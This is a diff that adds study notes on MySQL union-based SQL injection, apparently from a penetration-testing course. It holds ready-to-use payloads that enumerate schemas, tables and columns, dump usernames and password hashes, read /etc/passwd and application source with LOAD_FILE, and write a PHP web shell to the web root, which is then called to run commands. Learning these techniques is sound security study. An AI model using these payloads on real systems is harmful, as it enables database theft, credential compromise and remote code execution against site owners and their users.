@@ -603,3 +603,161 @@ If you see something like `10.3.22-MariaDB`, it means:
 
 
 
+# Database Enumeration
+
+To confirm it's MySQL, use these queries:
+
+| Payload            | Use Case            | Expected Result             |
+| ------------------ | ------------------- | --------------------------- |
+| `SELECT @@version` | When you see output | Shows MySQL/MariaDB version |
+| `SELECT POW(1,1)`  | Numeric-only output | Returns `1`                 |
+| `SELECT SLEEP(5)`  | Blind injection     | Delays for 5 seconds        |
+
+
+**Example:**
+
+`cn' UNION select 1,@@version,3,4-- -`
+
+**Use this SQL to get all database names:**
+
+`SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;`
+
+**To do it via SQLi:**
+
+`cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`
+
+Default MySQL DBs like mysql, information_schema, and performance_schema can usually be ignored.
+
+**To find the currently used database:**
+
+`cn' UNION select 1,database(),2,3-- -`
+
+**📋 Finding Tables in a Database**
+
+To list tables in a specific database (dev in this example), use:
+
+`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`
+
+This shows tables like:
+
+- credentials
+- framework
+- pages
+- posts
+
+
+
+**🧱 Finding Columns in a Table**
+
+To list column names inside the credentials table:
+
+`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`
+
+You might see:
+
+- username
+- password
+
+
+**🧾 Dumping the Data**
+
+Now that we know the table and columns, we can pull data:
+
+`cn' UNION select 1, username, password, 4 from dev.credentials-- -`
+
+Result: You get usernames and password hashes, possibly even an api_key.
+
+
+# Reading Files via SQL Injection
+
+**🔸 What Can SQL Injection Do Besides Reading Tables?**
+
+Besides extracting data from databases, SQL Injection can also:
+
+- Read/write files on the server
+- Execute code remotely, depending on the database and privileges
+
+**You can run one of these:**
+
+- `SELECT USER();`
+- `SELECT CURRENT_USER();`
+- `SELECT user FROM mysql.user;`
+
+Example: `cn' UNION SELECT 1, user(), 3, 4-- -`
+
+**Check all privileges:**
+
+`cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`
+
+If FILE is listed, you're allowed to read files from the server.
+
+**Use LOAD_FILE() to Read Files**
+
+If you have the FILE privilege, you can read files like this:
+
+`SELECT LOAD_FILE('/etc/passwd');`
+
+Injection example:
+
+`cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`
+
+**🔸 Read Web App Source Code**
+
+If you know the app path (e.g. /var/www/html/search.php), you can read its source:
+
+`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`
+
+You might see the source code or need to press Ctrl + U in your browser to view it.
+
+This can reveal:
+
+- Database credentials
+- Vulnerable functions
+- Hidden logic
+
+
+# Writing Files with SQL Injection
+
+
+**🔸 What You Need to Write Files in MySQL**
+
+✅ Three conditions must be met:
+
+- User has FILE privilege
+- secure_file_priv is empty (or allows writing)
+- Write access to the target folder
+
+
+| Value         | Meaning                           |
+| ------------- | --------------------------------- |
+| Empty (`''`)  | Full access to all folders ✅      |
+| Specific path | Only that directory is allowed ⚠️ |
+| NULL          | No read/write access at all ❌     |
+
+🔓 Union Injection Payload Example:
+
+<pre>cn' UNION SELECT 1, variable_name, variable_value, 4 
+FROM information_schema.global_variables 
+WHERE variable_name="secure_file_priv"-- -</pre>
+
+**🐚 Writing a Web Shell**
+
+<pre>cn' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "" 
+INTO OUTFILE '/var/www/html/shell.php'-- -</pre>
+
+🔍 Open in browser:
+
+`http://SERVER_IP:PORT/shell.php?0=id`
+
+
+**🔍 Finding the Web Root**
+
+If you don’t know the web directory:
+
+Try reading config files:
+
+- Apache: /etc/apache2/apache2.conf
+- Nginx: /etc/nginx/nginx.conf
+- Try common paths: /var/www/html/, /srv/http/
+- Use error messages or fuzzing
+
